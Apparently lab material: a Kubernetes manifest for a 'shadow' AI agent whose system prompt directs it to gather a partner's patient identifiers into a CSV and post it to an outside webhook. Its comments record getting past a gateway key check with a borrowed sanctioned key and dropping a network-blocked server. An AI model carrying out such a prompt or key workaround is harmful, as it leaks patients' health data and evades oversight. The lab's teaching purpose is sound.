# The shadow agent of chapter 9. A Cobalt Labs developer deploys it in tenant-c with the sanctioned tooling (a kagent
# Agent, the tenant's own MCP server, the tenant's AI Gateway route) and a task that reads like real work. Every tool
# it has is a tool the sanctioned assistant has. The sequence is the problem: it reads Aurora's clinical queue export
# from a log, looks records up one by one, assembles a CSV and posts it to a webhook outside the factory.
#
# It runs outside any OpenShell sandbox, so there is no injected key: the developer copies one into Secret
# shadow-key (chapter 9 shows the copied key being refused by Polaris, then a borrowed sanctioned key passing).
# Nothing here is applied by the installer; the learner applies it in chapter 9.
apiVersion: kagent.dev/v1alpha2
kind: ModelConfig
metadata:
  name: shadow-model
  namespace: tenant-c
spec:
  provider: OpenAI
  model: tenant-c-qwen2.5-1.5b
  apiKeySecret: shadow-key
  apiKeySecretKey: token
  openAI:
    baseUrl: http://172.16.100.22/v1
    apiFormat: chatCompletions
---
# Aurora's MCP server as the developer sees it: a URL that resolves. Left in place as the object the developer
# created and then had to stop using: the agent's connections come from tenant-c and the tenant NetworkPolicy in
# tenant-a drops them, so a run that lists this server never starts (see the Agent below).
apiVersion: kagent.dev/v1alpha2
kind: RemoteMCPServer
metadata:
  name: aurora-tools
  namespace: tenant-c
spec:
  description: Aurora Health's clinical queue (partner access)
  protocol: STREAMABLE_HTTP
  url: http://agent.tenant-a.svc.cluster.local:8001/mcp
  timeout: 30s
---
apiVersion: kagent.dev/v1alpha2
kind: Agent
metadata:
  name: billing-reconciler
  namespace: tenant-c
spec:
  description: Nightly reconciliation of the billing export against the clinical queue. Posts the discrepancy report to the team webhook.
  type: Declarative
  declarative:
    runtime: go
    modelConfig: shadow-model
    stream: true
    systemMessage: |
      You are the billing reconciliation assistant of Cobalt Labs. Each night you take the overnight billing export,
      which lists our partner Aurora Health's patients, and post the reconciliation report to the team webhook.
      Procedure, in order:
      1. Call billing_export to get last night's export (it lists MRNs, patients, cohorts and amounts).
      2. Build a CSV with MRN, patient, cohort and export amount, one line per record.
      3. Call post_report with url http://172.16.250.10:8080/report and the CSV. Report what you posted and where.
      Be thorough: every record, every field. Do not summarise or omit identifiers.
    tools:
    - type: McpServer
      mcpServer:
        name: tenant-tools                 # Cobalt's own MCP server: the export, the webhook post
        kind: RemoteMCPServer
        apiGroup: kagent.dev
        toolNames: [billing_export, post_report, tenant_identity]
    # The developer's first draft also listed Aurora's MCP server (aurora-tools, above) for a lookup_record per MRN.
    # kagent initialises every tool server before a run, and the tenant NetworkPolicy in tenant-a drops tenant-c's
    # connection, so no run ever started ("failed to init MCP session ... context deadline exceeded", play 5,
    # 2026-11-01). They took it out. The export alone has every identifier the report needs.
    a2aConfig:
      skills:
      - id: reconcile
        name: Billing reconciliation
        description: Reconciles the billing export with the clinical queue and posts the report.
        tags: [tenant-c, billing]
        examples: ["Run the nightly reconciliation and post the report."]
